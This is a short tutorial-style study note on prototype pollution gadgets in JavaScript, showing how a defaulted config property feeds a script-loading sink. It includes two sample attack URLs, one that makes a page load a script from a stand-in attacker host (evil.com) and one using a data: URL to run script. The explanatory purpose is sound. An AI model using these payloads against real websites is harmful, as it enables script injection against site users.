# Prototype Pollution Gadgets

### What is a Gadget?

- A **gadget** is what turns **prototype pollution** into a **real attack**.
- Prototype pollution alone just adds properties.
- A **gadget = polluted property + unsafe usage**.

---

### A Property Becomes a Gadget When

- It is **used by the application in an unsafe way**
    - Example: used in script loading, HTML injection, redirects, eval, etc.
- It is **attacker-controllable through prototype pollution**
    - The object **inherits** the malicious property from the prototype.

---

### When a Property is NOT a Gadget

- If the property is **defined directly on the object itself**
    - Object’s own property **overrides** prototype property.
- If the object’s prototype is set to **null**
    - No inheritance → no pollution impact.

---

### Why Gadgets Are Important

- Without a gadget → pollution may do **nothing**
- With a gadget → pollution can lead to:
    - **DOM XSS**
    - **Script injection**
    - **Open redirect**
    - **Remote Code Execution (server-side)**

---

## Common Gadget Scenario — Config Objects

- Many libraries accept a **configuration object**.
- If a property is missing, code uses a **default value**.
- Example logic:

```jsx
let transport_url = config.transport_url || defaults.transport_url;
```

- If `config.transport_url` is not set:
    - JavaScript may **inherit it from prototype**
    - This is where attacker control appears.

---

## Dangerous Usage Example

```jsx
let script = document.createElement('script');
script.src = transport_url + "/example.js";
document.body.appendChild(script);
```

- `transport_url` is used in a **script source**
- No validation → **dangerous sink**

---

## How an Attacker Exploits It

### Malicious URL Example

```
https://site.com/?__proto__[transport_url]=//evil.com
```

**What Happens:**

- Attacker adds `transport_url` to `Object.prototype`
- Config object inherits it
- Website loads script from attacker domain
- **Result: JavaScript execution**

---

## XSS Using Data URL

```
https://site.com/?__proto__[transport_url]=data:,alert(1);//
```

**Why it Works:**

- `data:` allows inline JavaScript
- `alert(1)` runs instantly
- `//` comments out `/example.js` so payload doesn’t break

---

## Simple Understanding

- **Prototype Pollution = Adding hidden properties globally**
- **Gadget = Place where that property is used dangerously**
- **Both together = Exploit**

---

## Key Security Points

- Gadgets are usually:
    - Optional config values
    - Defaulted properties
    - Dynamically used values
- High-risk sinks:
    - Script URLs
    - HTML insertion
    - Redirect URLs
    - Eval / Function calls

---

### One-Line Summary

**Prototype Pollution adds the weapon, Gadget pulls the trigger.** 🔐